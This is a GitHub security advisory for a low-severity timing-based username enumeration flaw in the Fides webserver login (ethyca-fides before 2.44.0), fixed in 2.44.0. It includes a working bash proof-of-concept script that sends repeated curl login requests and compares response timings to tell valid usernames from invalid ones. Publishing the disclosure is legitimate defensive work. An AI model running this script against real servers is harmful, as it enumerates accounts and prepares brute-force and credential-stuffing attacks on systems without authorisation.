# Timing-Based Username Enumeration Vulnerability in Fides Webserver Authentication

Low

[daveqnet](/daveqnet)
published
GHSA-2h46-8gf5-fmxv
Sep 4, 2024

## Package

pip

ethyca-fides
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.44.0

## Patched versions

2.44.0

## Description

A timing-based username enumeration vulnerability has been identified in Fides Webserver authentication. This vulnerability allows an unauthenticated attacker to determine the existence of valid usernames by analyzing the time it takes for the server to respond to login requests. The discrepancy in response times between valid and invalid usernames can be leveraged to enumerate users on the system.

### Impact

This vulnerability enables a timing-based username enumeration attack. An attacker can systematically guess and verify which usernames are valid by measuring the server's response time to authentication requests. This information can be used to conduct further attacks on authentication such as password brute-forcing and credential stuffing.

### Patches

The vulnerability has been patched in Fides version `2.44.0`. Users are advised to upgrade to this version or later to secure their systems against this threat.

### Workarounds

There are no workarounds.

### Proof of Concept

1. Create a valid user called `valid_user` on a remote Fides server. Ensure that there is no user on the server named `invalid_user`. Note that this vulnerability is not reproducible on a local deployment due to the extremely low latency of responses to login requests.
2. In a terminal run `export LOGIN_URL='https://example.com/api/v1/login'`, replacing `example.com` with your remote Fides server's domain or IP address.
3. In the same terminal run `exploit-poc.sh` (detailed below).
4. It's possible to distinguish between valid and invalid users based on the low latency (time difference) for invalid users.

Exploit PoC script
```
#!/bin/bash

# Function to test login and calculate average transfer times
test_login(){
  echo -e "\nTesting login for user: $1\n"
  total_diff=0

  for (( i=1; i <= 20; ++i ))
  do
    echo -n "Attempt #$i: "
    resp=$(curl -w @- "$LOGIN_URL" \
      -H 'content-type: application/json' \
      --data-raw '{"username":"'$1'","password":"d3JvbmdwYXNzd29yZA=="}' \
      -o /dev/null -s <<'EOF'
      {
        "pretransfer":  %{time_pretransfer},
        "starttransfer": %{time_starttransfer}
      }
EOF
    )

    pre=$(echo $resp | jq '.pretransfer')
    start=$(echo $resp | jq '.starttransfer')
    diff=$(echo "$start - $pre" | bc)

    # Accumulate total diff
    total_diff=$(echo "$total_diff + $diff" | bc)

    # Print the result of this iteration
    printf "Pretransfer: %.4f, Starttransfer: %.4f, Diff: %.4f\n" "$pre" "$start" "$diff"
  done

  # Calculate average diff
  avg_diff=$(echo "scale=4; $total_diff / 20" | bc)

  # Print average time
  echo -e "\nAverage Time Difference for $1: $avg_diff seconds\n"
}

# Ensure that LOGIN_URL is set
if [ -z "$LOGIN_URL" ]; then
  echo "Error: LOGIN_URL environment variable is not set."
  exit 1
fi

# Test valid and invalid users
test_login valid_user
test_login invalid_user
```

Sample script run
```
